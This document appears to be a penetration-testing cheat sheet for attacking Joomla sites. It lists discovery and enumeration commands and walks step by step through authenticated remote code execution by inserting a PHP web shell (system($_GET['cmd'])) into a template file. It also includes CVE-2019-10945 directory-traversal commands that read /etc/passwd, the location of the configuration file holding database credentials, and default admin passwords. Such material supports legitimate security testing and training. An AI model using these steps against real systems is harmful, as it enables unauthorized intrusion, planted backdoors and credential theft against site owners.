# Joomla

## Discovery

```bash
# Check robots.txt for Joomla paths
curl http://TARGET/robots.txt

# Version in XML
curl -s http://TARGET/administrator/manifests/files/joomla.xml | grep version

# README file
curl -s http://TARGET/README.txt | head

# Login page
/administrator/
```

---

## Enumeration Tools

### JoomScan

```bash
# Install
apt install joomscan

# Basic scan
joomscan -u http://TARGET

# Enumerate components
joomscan -u http://TARGET -ec
```

### droopescan

```bash
# Also works for Joomla
droopescan scan joomla -u http://TARGET
```

---

## Template Editor RCE (Authenticated)

1. Login to `/administrator` with admin creds
2. Navigate: `Extensions → Templates → Templates`
3. Select a template (e.g., `protostar`)
4. Edit `error.php` or another file
5. Add PHP web shell:

```php
system($_GET['cmd']);
```

6. Save and access:

```bash
curl http://TARGET/templates/protostar/error.php?cmd=id
```

---

## CVE-2019-10945 (Directory Traversal)

**Affects:** Joomla 1.5.0 - 3.9.4

**Requires:** Valid admin credentials

### Exploit

```bash
# List directory contents
python2.7 joomla_dir_trav.py --url "http://TARGET/administrator/" --username admin --password admin --dir /

# Read specific file
python2.7 joomla_dir_trav.py --url "http://TARGET/administrator/" --username admin --password admin --dir /etc/passwd
```

**PoC:** https://www.exploit-db.com/exploits/46710

---

## Config File

```bash
# Database credentials
/configuration.php

# Contains:
public $user = 'joomla_user';
public $password = 'password123';
public $db = 'joomla_db';
```

---

## Important Paths

| Path | Description |
|------|-------------|
| `/administrator/` | Admin login |
| `/configuration.php` | Main config (DB creds) |
| `/templates/` | Template files |
| `/plugins/` | Plugin directory |
| `/components/` | Components |
| `/modules/` | Modules |

---

## Default Credentials

```
admin:admin
administrator:administrator
```
